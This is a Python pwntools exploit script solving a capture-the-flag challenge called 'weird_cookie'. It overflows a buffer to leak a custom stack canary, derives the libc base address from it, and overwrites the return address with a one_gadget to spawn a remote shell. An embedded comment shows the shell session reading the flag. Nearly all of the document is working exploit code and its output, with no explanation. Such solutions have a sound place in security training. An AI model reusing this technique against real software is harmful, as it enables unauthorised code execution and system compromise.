#!/usr/bin/python

from pwn import *

ELF_PATH = './weird_cookie'

elf  = ELF(ELF_PATH, 0)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)

gdbscript = ''''''

"""
$ python solver.py 30824
[+] Opening connection to challenge.ctf.games on port 30824: Done
[*] leak 0x7fec3b993f70
[*] libc 0x7fec3b92f000
[*] Switching to interactive mode
$ id
sh: 1: id: not found
$ ls -l
total 48
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 bin
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 dev
drwxr-xr-x 1 root 0  4096 Dec 28 19:26 etc
-r--r--r-- 1 root 0    39 Dec 28 19:25 flag.txt
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 lib64
drwxr-xr-x 1 root 0  4096 Dec 28 19:25 usr
---x--x--x 1 root 0 17000 Dec 28 19:25 weird_cookie
$ cat flag.txt
flag{e87923d7cd36a8580d0cf78656d457c6}
$ 
[*] Interrupted
[*] Closed connection to challenge.ctf.games port 30824
"""

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    p = "a"*0x28
    r.sendafter("?\n", p)
    
    canary = u64(r.recvline(0)[0x28:0x30])
    printf = canary ^ 0x123456789ABCDEF1
    libc.address = printf - libc.sym['printf']

    info("leak 0x%x", printf)
    info("libc 0x%x", libc.address)

    p += p64(canary)
    p += p64(canary)
    p += p64(libc.address + 0x4f432) # one_gadget
    
    # debug(gdbscript)

    r.sendafter(".\n", p)


    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
